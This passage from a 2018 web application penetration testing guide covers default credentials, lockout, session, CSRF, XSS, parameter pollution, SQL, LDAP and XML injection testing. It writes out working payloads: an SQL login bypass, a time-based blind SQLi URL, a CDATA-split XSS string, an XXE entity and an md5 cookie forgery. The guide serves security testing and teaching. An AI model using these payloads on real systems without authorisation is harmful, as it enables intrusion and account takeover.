still encrypted making the URL unreadable to a malicious user using a sniffer. Nevertheless as 
stated 
before, it is not a good practice to use the GET method to send sensitive data to a web application, 
because the information contained in the URL can be stored in many locations such as proxy and web 
server logs. 
2. Testing for default credentials 
How to Test 
Testing for default credentials of common applications 
 
Try default usernames such as: admin, administrator, root, system, guest, operator, superuser. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
60 
 
 
 
 
Application administrative users are often named after the application or organization. It mean if 
you are testing an application named “ABC”, trying abc/abc or any other similar combination as 
username and password. 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
61 
 
 
 
Using above username with blank passwords. 
 
 
Review the page source code and JavaScript, Look for account names and password  written in 
comments. 
 
 
Check for configuration files that contain usernames and passwords. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
62 
 
 
 
Check for password hints. 
 
 
Testing for default password of new accounts? 
Tools 
 
Burp Intruder 
 
Hydra 
 
Nikto 
 
Medusa 
References 
 
CIRT http://www.cirt.net/passwords 
3. Testing for Weak lock out mechanism 
Overview 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
63 
 
Account lockout mechanisms are used to mitigate brute force password guessing attack. Account are 
typically locked after 3 to 5 unsuccessful login attempts and can only be unlocked after a predetermined 
period of time, via a self-service unlock mechanism, or intervention by an administrator. Account lockout 
mechanisms require a balance between protecting accounts from unauthorized access and protecting users 
from being denied authorized access. 
Test Objective 
 
Evaluate the account lockout mechanism’s ability to mitigate brute force password guessing 
 
Evaluate the unlock mechanism’s resistance to unauthorized account unlocking. 
How to test 
 
Using Burp Intruder & Burp Repeater to Brute force target site 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
64 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
65 
 
 
 
Review source code 
 
 
Make sure website have accout lockout policy – Test for an account indeed lock after a certain 
number of fail login 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
66 
 
 
 
Make sure application response limited timeout for user and verify limited timeout is correctly 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
67 
 
 
 
 
 
Make sure application warn user when they are approaching lockout thread hold 
 
A CAPTCHA may hinder brute force attack, but they can not replace a lockout mechanism. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
68 
 
 
 
Try for bypass lockout time out 
 
List all ways to unlocked account of website, Make sure they are secure 
4. Testing for bypassing authentication schema 
How to test 
 
Parameter modification 
When the application verifies a successful log in on the basis of a fixed value parameters. A user 
could modify these parameters to gain access to the protected areas without providing valid 
credentials. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
69 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
70 
 
 
 
 
Session manipulate 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
71 
 
 
 
 
SQL Injection 
SQL Injection is a widely known attack technique. This section is not going to describe this 
technique in detail as there are several sections in this guide that explain injection techniques 
beyond the scope of this section. 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
72 
 
 
 
Direct page request (Forced Browsing) 
If a web application implements access control only on the log in page, the authentication schema 
could be bypassed. 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
73 
 
 
 
Session ID Predict 
Many web applications manage authentication by using session identifiers 
(session 
IDs). 
Therefore, if session ID generation is predictable, a malicious user could be able to find a valid 
session ID and gain unauthorized access to 
the 
application, 
impersonating 
a 
previously 
authenticated user. 
Tools 
 
Burp Suite 
 
ZAP 
 
WebGoat 
5. Test remember password functionality 
 
How to Test: 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
74 
 
 
Look for password being stored in a cookie. Examine the cookies stored by the application. 
Verify that the credentials are not stored in clear text, but are hased. 
 
 
 
Examine the hashing mechanism: if it is a common, well-know algorithm, check for its strength, 
it homegrown hash functions, attempt several usernames to check whether the hash function is 
easily guessable. 
 
 
Verify that the credentials are only sent during the log in phase, and not sent together with every 
request to the application. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
75 
 
 
 
Consider other sensitive  form fields (e.g. an answer to a secret question that must  be entered in a 
password recovery or account unlock form). 
 
Check for: autocomplete = “off” 
 
6. Testing for Browser cache weakness 
Browsers can store information for purposes of caching and history. Caching is used to improve 
performance, so that previously displayed information doesn't need to be downloaded 
again. 
History 
mechanisms are used for user convenience, so the user can see exactly what they saw at the time when the 
resource was retrieved. If sensitive information is displayed to the user (such as their address, credit card 
details, Social Security Number, or username), then this information could be stored for purposes of 
caching or history, and therefore retrievable through examining the browser's cache or by simply pressing 
the browser's "Back" button. 
How to test: 
If by pressing the "Back" button  the tester can access previous pages but not access new ones, then it is 
not an authentication issue, but a browser history issue. If these pages contain sensitive data, it means that 
the application did not forbid the browser from storing it. 
Authentication does not necessarily need to be involved in the testing. For example, when a user enters 
their email address in order to sign up to a newsletter, this information could be retrievable if not properly 
handled. 
The "Back" button can be stopped from showing  sensitive data. This can be done by: 
 
Delivering the page over HTTPS.  
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
76 
 
 
Setting Cache-Control: must-re-validate 
 
Browser Cache. In Here testers check that the application does not leak any sensitive data into the browser 
cache. In order to do that, they can use a proxy (such as Burp Suite) and search through the 
server 
responses that belong to the session, checking that for every page  that contains sensitive information the 
server instructed the browser not to cache any data. Such a directive can be issued in the HTTP response 
headers: 
 
Cache-Control: no-cache, no-store  
 
Expires: 0  
 
Pragma: no-cache 
These directives are generally robust, although additional flags may be necessary for the Cache-Control 
header in order to better prevent persistently linked files on the file system: 
 
Cache-Control: must-revalidate, pre-check=0, post-check=0, max-age=0, s-maxage=0 
The exact location where that information is stored depends on the client operating system and on  the 
browser  that has been used. 
Mozilla Firefox: 
 
Unix/Linux: ~/.mozilla/firefox//Cache/  
 
Windows: 
C:\Documents 
and 
Settings\\Local 
Settings\Application 
Data\Mozilla\Firefox\Profiles\\Cache  
Internet Explorer: 
 
C:\Documents and Settings\\Local Settings\Temporary Internet Files 
Example: 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
77 
 
 
Login with name root password toor and intercept to analysis packet 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
78 
 
 
 
 
As you can see, we are not have any Cache-control header in response packet. 
From message board page, let’s click logout button. And click “Back button” on your browser or in 
history (Ctrl + H) choose message board , we will catch this result out. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
79 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
80 
 
 
 
7. Testing for Weak password policy 
Test objectives 
Determine the resistance of the application against brute force password guessing 
using 
available 
password dictionaries by evaluating the length, complexity, reuse and aging requirements of passwords. 
How to test: 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
81 
 
 
1. What characters are permitted and forbidden for use within a password? Is the user required to
 
use characters from different character sets such as lower and uppercase letters, digits and 
special symbols?  
 
2. How often can a user change their password? How quickly can a user change their password
 
after a previous change? Users may bypass password history requirements by changing
 
their password 5 times in a row so that after the last password change they have
 
configured their initial password  again.  
 
3. When must a user change their password? After 90 days? After account lockout due to
 
excessive log on attempts?  
 
4. How often can a user reuse a password? Does  the application maintain a history of the user's 
previous used 8 passwords?  
 
5. How different must the next password be from the last password?  
 
6. Is the  user prevented from using his username or other account information (such as first or 
last name) in the password? 
Example: 
 
Review source code and get present password policy of system, make sure they following 
something shown below: 
(Password must meet at least 3 out of the following 4 complexity rules)  
- 
At least 1 uppercase character (A-Z)  
- 
At least 1 lowercase character (a-z)  
- 
At least 1 digit (0-9)  
- 
At least 1 special character  
- 
At least 10 characters  
- 
At most 128 characters  
- 
Not more than 2 identical characters in a row (e.g., 111 not allowed)  
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
82 
 
 
 
Try to Bypass client side 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
83 
 
 
 
 
Generate commonly password file and try to login to make sure website ban commonly password 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
84 
 
 
 
If password not comply policy password, make sure error message will be show to user 
 
 
Check for password hint 
 
 
List all forbidden characters such as: < > / + … and make sure they are not used in password 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
85 
 
 
 
Make sure password does not same username 
 
 
8. Testing for weak security Question/Answer 
How to test: 
 
Make sure no shared knowlegde secret question 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
86 
 
9. Testing for weak password change or reset function 
Test objectives 
 
Determine the resistance of the application to subversion  of the account change process allowing 
someone to change the password of an account.  
 
Determine the resistance of the passwords reset functionality against guessing or bypassing 
How to Test 
 
If users, other than administrators, can change or  reset passwords for accounts other than  their 
own.  
 
If users can manipulate or subvert the password change or reset process to change or reset the 
password of another user or administrator.  
 
If the password change or reset process is vulnerable to CSRF. 
 
Authorization Testing 
1. Testing Directory traversal / file include 
During an assessment, to discover path traversal and file include flaws, testers need to perform two 
different stages: 
 
Input Vectors Enumeration 
 
Testing Techniques 
Example: 
 
In Window IIS 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
87 
 
 
 
In Linux Apache 
 
 
2. Testing for Privilege Escalation 
Privilege escalation occurs when a user gets access to more resources or functionality than they are 
normally allowed, a such elevation or changes should have been prevented by the application. This is 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
88 
 
usually caused by a flaw in the application. The result is that the application performs actions with more 
privileges than those intended by the developer system administrator. 
How to Test 
 
Testing for role/privilege manipulation 
Test Example 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
89 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
90 
 
 
 
 
3. Testing for Insecure Direct Object References 
Insecure Direct Object References occur when an application provides direct access to objects based on 
user-supplied input. As a result of this vulnerability attackers can bypass authorization and access 
resources in the system directly, for example database records or files. 
 
Insecure Direct Object References allow attackers to bypass authorization and access resources directly 
by modifying the value of a parameter used to directly point to an object. Such resources can be database 
entries belonging to other users, files in the system, and more. This is caused by the fact that 
the 
application takes user supplied input and  uses it to retrieve an object without performing sufficient 
authorization checks. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
91 
 
How to Test 
 
Map out all locations in the application where user input is used to reference objects directly. The 
best way to test for direct object references would be by having at least two or more users to 
cover different own objects and functions. 
 
The value of a parameter is used directly to retrieve a database record 
 
The value of a parameter is used directly to perform an operation in the system 
 
The value of a parameter is used directly to retrieve a file system resource 
 
The value of a parameter is used directly to access application functionality 
Test example 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
92 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
93 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
94 
 
Session Management Testing 
1. Testing for Bypassing Session Management Schema 
In this test, the tester has to check whether the cookies issued to clients can resist range of attacks aimed 
to interfere with the sessions of legitimate users and with the application itself. The overall goal is to be 
able to forge a that will be considered valid by the application and that will provide some kind of 
unauthorized access. 
How to test  
Usually the main steps of the attack pattern are the following: 
 
Cookie collection: collection of a sufficient number of cookie samples 
 
Cookie reverse engineering: analysis of the cookie generation algorithm 
 
Cookie manipulation: forging of a valid cookie in order to perform the attack, this last step might 
require a large number of attempts, depending on how the cookie is created (cookie brute force 
attack) 
Test example 
 
Cookie Collection 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
95 
 
 
 
Cookie Reverse Engineering 
 
Cookie manipulation 
Guess administrator’s username admin have cookie like below: 
  
Cookie = md5(admin)= 21232f297a57a5a743894a0e4a801fc3 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
96 
 
 
 
 
2. Testing for Cookies attributes 
How to Test 
Testing for cookie attribute vulnerabilities 
By using an intercepting proxy or traffic intercepting browser plug-in, trap all response where a cookie is 
set by the application (using the Set-cookie directive) and inspect the cookie for the following: 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
97 
 
 
Secure Attribute – Whenever a cookie contains sensitive information or is a session token, then 
it should always  be passed using  an encrypted tunnel. For example, after logging into an 
application and a session token is set using a cookie, then verify it is tagged using the ";secure" 
flag. If it is not, then the browser would agree to  pass it via an unencrypted channel such as using 
HTTP, and this could lead to an attacker leading users into submitting their cookie over an 
insecure channel. 
 
HttpOnly Attribute – This attribute should always be set even though not every browser supports 
it. This attribute aids in securing the cookie from being accessed by a client side script, it does not 
eliminate cross site scripting risks but does eliminate some exploitation vectors. Check to see 
if 
the "HttpOnly" tag has been set. 
 
Domain  Attribute – Verify that the domain has not been set too loosely. It should  only be  set for 
the server that needs to receive the cookie. For example if the application resides 
on 
server 
app.mysite.com, then it should be set to " 
domain=app.mysite.com" 
and 
NOT 
" 
domain=.mysite.com" as this would allow other potentially vulnerable servers to receive the 
cookie. 
 
Path Attribute – Verify that the path attribute, just as the Domain attribute, has not been set too 
loosely.  Even if the Domain attribute has been configured as tight as possible, if the path is set to 
the root directory "/" then it can be vulnerable to less secure applications on the same server. For 
example, if the application resides at /myapp/, then verify that the cookies path is set 
to 
"; 
path=/myapp/" and NOT "; path=/" or "; path=/myapp". Notice here that  the trailing "/" must be 
used after myapp. If it is  not used, the browser will send the cookie to any path that matches 
"myapp" such as "myapp-exploited". 
 
Expires Attribute – If this attribute is set to a time in the future verify that the cookie does  not 
contain any sensitive information. For example, if a cookie is set  to "; expires=Sun, 31-Jul-2019 
13:45:29 GMT" and it is currently July 31st 2018, then the tester should inspect the cookie. If 
the cookie is a session token that is stored on the  user's hard drive then an attacker or local user 
(such as  an admin) who has access to this cookie can access the application by resubmitting this 
token until the expiration date passes/ 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
98 
 
3. Testing for Session Fixation 
Summary 
When an application does not renew its session cookie(s) after a successful user authentication, it could 
be possible to find a session fixation vulnerability and force a user to utilize a cookie known by the 
attacker. In that case, an attacker could steal the user session (session hijacking). 
Session fixation vulnerabilities occur when: 
 
A web application authenticates a user without first invalidating the existing session ID, there by 
continuing to use the session ID already associated with the user.  
 
An attacker is able to force a known session ID on a user so that,  once the user authenticates, the
 
attacker has access to the authenticated session. 
Test example 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
99 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
100 
 
 
4. Testing for Exposed Session Variables 
How to Test 
Testing for Encryption & Reuse of Session Tokens Vulnerabilities 
Every time the authentication is successful, the user should expect to receive 
 
A different session token 
 
 
A token sent via encrypted channel every time they make HTTP Request 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
101 
 
 
Testing for Proxies & Caching vulnerabilities 
The “Expires: 0” and Cache-Control: max-age=0 directives should be used to further ensure caches do 
 
not expose the data. Each request/response passing Session ID data should be examined to 
ensure 
appropriate cache directives are in use. 
 
Testing for GET & POST vulnerabilities 
All server side code receiving data from POST requests should be tested to ensure it does not accept the 
data if sent as a  GET. 
 
5. Testing for Cross Site Request Forgery (CSRF) 
CSRF is an attack which forces an end user to execute unwanted  actions on a web application in which 
he/she is currently authenticated. With a little help of social engineering (like sending a link via email or 
chat), an attacker may force the users of  a web application to execute actions of the attacker's choosing. 
A successful CSRF exploit can compromise end user data and operation, when it targets a normal user. If 
the targeted end user is the administrator account, a CSRF attack can 
compromise 
the 
entire 
web 
application. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
102 
 
How to Test 
 
Let u the URL being tested, u=http://abc.com/action 
 
 
Build an html page containing the http request referencing URL u (specifying all relevant 
parameters, in the case of http GET this is straightforward, while to a POST request you need to 
resort to some javascript). 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
103 
 
 
 
Make sure that the valid user logged on the application 
 
 
Induce him into following the link pointing to the URL to be tested (Social engineering involved 
if you cannot impersonate the user yourself) 
 
 
Observe the result, check if the web server executed the request 
 
// CSRF with Burp 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
104 
 
6. Testing for logout functionality 
How to Test 
Testing for log out user interface 
There are some properties which indicate a good log out user interface 
 
A log out button is present on all pages of the web application 
 
The log out button should be identified quickly by a user who wants to log out from the web 
application 
 
After loading a page the log out button should be visible without scrolling 
 
Ideally the log out button is placed in an area of the page that is fixed in the view port of the 
browser and not affected by scrolling of the content 
 
Verify that the following scenario: Login to the system, access a authozied page, copy the url of the page, 
logout, paste the URL in the address bar, click on go, click on another authozied page, the system requires 
the permission to access it. 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
105 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
106 
 
7. Test Session Timeout 
The proper value for the session timeout depends on the purpose of the application and should be a 
balance of security and usability. In a banking applications it makes no sense to keep an inactive session 
more than 15 minutes. On the other side a short timeout in a wiki or forum could annoy users which are 
typing lengthy articles with unnecessary log in requests. There timeouts of an hour and more can be 
acceptable. 
How to test 
Test with Burp extension 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
107 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
108 
 
 
Input Validation Testing 
Testing for Cross site Scripting 
Cross Site Scripting (XSS) testing checks if it is possible to manipulate the input parameters of the 
application so that it generates malicious output. Testers find an XSS vulnerability when the application 
does not validate their input and creates an output that is under their control. This vulnerability leads to 
various attacks, for example, stealing confidential information (such as session cookies) or taking control 
of the victim's browser. An XSS attack breaks the following pattern: Input -> Output == cross-site 
scripting. 
1. Testing for Reflected Cross Site Scripting 
Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a 
single HTTP response. The injected attack is not stored within the application itself; it is non-persistent 
and only impacts users who open a maliciously crafted link or third-party web page. The attack string is 
included as part of the crafted URI or HTTP parameters, improperly processed by the application, and 
returned to the victim. 
 
How to Test 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
109 
 
 
Detect input vectors. For each web page, the tester must determine all the web application's user-
defined variablesand how to input them. This includes hidden or non-obvious inputs such as 
HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. 
 
Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the 
tester will typically use specially crafted input data with each input vector. Such input data is 
typically harmless, but trigger responses from the web browser that manifests the vulnerability. 
Testing data can be generated by using a web application fuzzer, an automated predefined list of 
known attack strings, or manually. 
 
For each test input attempted in the previous phase, the tester will analyze the result and 
determine if it represents a vulnerability that has a realistic impact on the web application's 
security. This requires examining the resulting web page HTML and searching for the test input. 
Once found, the tester identifies any special characters that were not properly encoded, replaced, 
or filtered out. The set of vulnerable unfiltered special characters will depend on the context of 
that section of HTML. 
Example 
 
In this case, in first step, we need to detecting all input vectors which can affected by XSS, such 
as input field or any URL's parameters. 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
110 
 
 
 
Generate testing data with fuzzer or manually. 
 
 
 
Analyze the results 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
111 
 
 
 
Bypass XSS filter 
Reflected cross-site scripting attacks are prevented as the web application sanitizes input, a web 
application firewall blocks malicious input, or by mechanisms embedded in modern web browsers. The 
tester must test for vulnerabilities assuming that web browsers will not prevent the attack. Browsers may 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
112 
 
be out of date, or have built-in security features disabled. Similarly, web application firewalls are not 
guaranteed to recognize novel, unknown attacks. An attacker could craft an attack string that is 
unrecognized by the web application firewall. 
References this link for more information 
 
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet 
Example 
 
Pentester can open and review page source to analyze source code for filtering XSS mechanism 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
113 
 
 
 
2. Testing for Stored Cross Site Scripting 
Stored XSS occurs when a web application gathers input from a user which might be malicious, and then 
stores that input in a data store for later use. The input that is stored is not correctly filtered. As a 
consequence, the malicious data will appear to be part of the web site and run within the user’s browser 
under the privileges of the web application. Since this vulnerability typically involves at least two 
requests to the application. 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
114 
 
How to Test 
Input Forms 
 
The first step is to identify all points where user input is stored into the back-end and then 
displayed by the application. Typical examples of stored user input can be found in: 
o User/Profiles page: the application allows the user to edit/change profile details such as 
first name, last name, nickname, avatar, picture, address, etc 
o Shopping cart: the application allows the user to store items into the shopping cart which 
can then be reviewed later 
o File Manager: application that allows upload of files 
o Application settings/preferences: application that allows the user to set preferences 
o Forum/Message board: application that permits exchange of posts among users 
o Blog: if the blog application permits to users submitting comments 
o Log: if the application stores some users input into logs. 
 
Analyze HTML code 
Input stored by the application is normally used in HTML tags, but it can also be found as part of 
JavaScript content. At this stage, it is fundamental to understand if input is stored and how it is positioned 
in the context of the page. Differently from reflected XSS, the pen-tester should also investigate any out-
of-band channels through which the application receives and stores users input. 
Note: All areas of the application accessible by administrators should be tested to identify the presence of 
any data submitted by users. 
Example 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
115 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
116 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
117 
 
 
//Some XSS exploit demo 
//Xenotic tools, xsstrike,automate scanner 
 
3. Testing for HTTP Verb Tampering 
References: Configuration and Deployment Management Testing - Test HTTP Methods  
4. Testing for HTTP Parameter pollution 
Supplying multiple HTTP parameters with the same name may cause an application to interpret values in 
unanticipated ways. By exploiting these effects, an attacker may be able to bypass input validation, trigger 
application errors or modify internal variables values. As HTTP Parameter Pollution (in short HPP) 
affects a building block of all web technologies, server and client side attacks exist. 
Current HTTP standards do not include guidance on how to interpret multiple input parameters with the 
same name. By itself, this is not necessarily an indication of vulnerability. However, if the developer is 
not aware of the problem, the presence of duplicated parameters may produce an anomalous behavior in 
the application that can be potentially exploited by an attacker. As often in security, unexpected behaviors 
are a usual source of weaknesses that could lead to HTTP Parameter Pollution attacks in this case. To 
better introduce this class of vulnerabilities and the outcome of HPP attacks, it is interesting to analyze 
some real-life examples that have been discovered in the past. 
How To Test 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
118 
 
A more in-depth analysis would require three HTTP requests for each HTTP parameter: 
 
Submit an HTTP request containing the standard parameter name and value, and record the 
HTTP response. E.g.page?par1=val1 
 
Replace the parameter value with a tampered value, submit and record the HTTP response. E.g. 
page?par1=HPP_TEST1 
 
Send a new request combining step (1) and (2). Again, save the HTTP response. E.g. 
page?par1=val1&par1=HPP_TEST1 
 
Compare the responses obtained during all previous steps. If the response from (3) is different 
from (1) and the response from (3) is also different from (2), there is an impedance mismatch that 
may be eventually abused to trigger HPP vulnerabilities. 
 
Crafting a full exploit from a parameter pollution weakness is beyond the scope of this text. See 
the references for examples and details. 
Example 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
119 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
120 
 
 
register with name: cloud&movie=3 and vote for movie with id=1 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
121 
 
 
 
5. Testing for SQL Injection 
An SQL injection  attack consists of insertion or "injection" of either a partial or complete SQL query via 
the data input or transmitted from the client (browser) to the web application. A successful SQL injection 
attack can read sensitive data from the database, modify database data (insert/update/delete), execute 
administration operations on the database (such as shutdown the DBMS), recover the content of a given 
file existing on the DBMS file system or write files into the file system, and, in some cases, issue 
commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL 
commands are injected into data-plane input in order to affect the execution of predefined SQL 
commands. 
 
Authentication Bypass 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
122 
 
 
SELECT * FROM Users WHERE Username='$username' AND Password='$password' 
A similar query is generally used from the web application in order to authenticate a user. If the query 
returns a value it means that inside the database a user with that set of credentials exists, then the user is 
allowed to login to the system, otherwise access is denied. The values of the input fields are generally 
obtained from the user through a web form. Suppose we insert the following Username and Password 
values: 
$username = cloud’ 
$password = 1' or '1' = '1 
The query will be: 
SELECT * FROM Users WHERE Username='cloud’ AND Password='1' OR '1' = '1' 
After a short analysis we notice that the query returns a value (or a set of values) because the condition is 
always true (OR 1=1). In this way the system has authenticated the user without knowing the username 
and password. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
123 
 
 
 
Error-Based SQL Injection 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
124 
 
 
An Error based exploitation technique is useful when the tester for some reason can’t exploit the SQL 
injection vulnerability using other technique such as UNION. The Error based technique consists in 
forcing the database to perform some operation in which the result will be an error. The point here is to 
try to extract some data from the database and show it in the error message. This exploitation technique 
can be different from DBMS to DBMS (check DBMS specific section). 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
125 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
126 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
127 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
128 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
129 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
130 
 
 
Boolean-based SQLi 
The Boolean exploitation technique is very useful when the tester finds a  Blind SQL Injection situation, 
in which nothing is known on the outcome of an operation. For example, this behavior happens in cases 
where the programmer has created a custom error page that does not reveal anything on the structure of 
the query or on the database. (The page does not return a SQL error, it may just return a HTTP 500, 404, 
or redirect). 
The tests that we will execute will allow us to obtain the value of the username field, extracting such 
value character by character. This is possible through the use of some standard functions, present in 
practically every database. We will use the following pseudo-functions: 
SUBSTRING (text, start, length) : returns a substring starting from the position "start" of text and of 
length "length". If "start" is greater than the length of text, the function returns a null value. 
ASCII (char) : it gives back ASCII value of the input character. A null value is returned if char is 0. 
LENGTH (text) : it gives back the number of characters in the input text. 
Time-based SQLi 
The Boolean exploitation technique is very useful when the tester find a Blind SQL Injection situation, in 
which nothing is known on the outcome of an operation. This technique consists in sending an injected 
query and in case the conditional is true, the tester can monitor the time taken to for the server to respond. 
If there is a delay, the tester can assume the result of the conditional query is true. This exploitation 
technique can be different from DBMS to DBMS (check DBMS specific section). 
Consider the following SQL query: 
SELECT * FROM products WHERE id_product=$id_product 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
131 
 
Consider also the request to a script who executes the query above: 
http://www.example.com/product.php?id=10 
The malicious request would be (e.g. MySql 5.x): 
http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))-- 
In this example the tester if checking whether the MySql version is 5.x or not, making the server to delay 
the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester 
also doesn’t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel 
the request after some seconds. 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
132 
 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
133 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
134 
 
 
6. Testing for LDAP Injection 
The Lightweight Directory Access Protocol (LDAP) is used to store information about users, hosts, and 
many other objects. LDAP injection is a server side attack, which could allow sensitive information about 
users and hosts represented in an LDAP structure to be disclosed, modified, or inserted. This is done by 
manipulating input parameters afterwards passed to internal search, add, and modify functions. 
A web application could use LDAP in order to let users authenticate or search other users' information 
inside a corporate structure. The goal of LDAP injection attacks is to inject LDAP search filters 
metacharacters in a query which will be executed by the application. 
Boolean conditions and group aggregations on an LDAP search filter could be applied by using 
the 
following metacharacters. 
 
A successful exploitation of an LDAP injection vulnerability could allow the tester to: 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
135 
 
 
Access unauthorized content 
 
Evade application restrictions 
 
Gather unauthorized information 
 
Add or modify Objects inside LDAP tree structure 
How to test 
Example test: Login 
 
 
 
Two inverse query resulted in different response. 
Retest with Vulnerabilities Scanner 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
136 
 
 
7. Testing for XML Injection 
XML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser 
fails to contextually validate data, then the test will yield a positive result. 
How to Test 
Discovery : the first step in order to test an application for the presence of a XML Injection vulnerability 
consists of trying to insert XML metacharacters. 
XML metacharacters are: 
 
Single Quote: ’ – when not sanitized, this character could throw an exception during XML 
parsing, if the injected value is going to be part of an attribute value in a tag. 
 
Double Quote: ” – this character has same meaning as single quote and it could be used if the 
attribute value is enclosed in double quotes. 
 
Angular parentheses: > and <  
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
137 
 
 
 
Comment tag: <!-- - this sequence of characters is interpreted as the beginning/end of a comment. 
 
 
Ampersand: &amp; -  the ampersand is used in the XML syntax to represent entities. The format 
of an entity is ‘&amp;symbol’.  
 
 
CDATA section delimiters: <![CDATA[ / ]]>  -  CDATA sections are used to escape blocks of 
text containing characters which would otherwise be recognized as markup. In other words, 
characters enclosed in a CDATA section are not parsed by an XML parser. 
<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>  
During the processing, the CDATA section delimiters are eliminated, generating the xss code. 
External Entity 
The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, 
the entity is called an external entity. Unless configured to do otherwise, external entities force the XML 
parser to access the resource specified by the URI, a file on the local machine or on a remote systems. 
This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to 
perform denial of service of the local system, gain unauthorized access to files on the local machine, scan 
remote machines, and perform denial of service of remote system. 
To test for XXE vulnerabilities, on can use the following input: 
<?xml version="1.0" encoding="ISO-8859-1"?> 
  <!DOCTYPE foo [   
   <!ELEMENT foo ANY > 
   <!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo> 
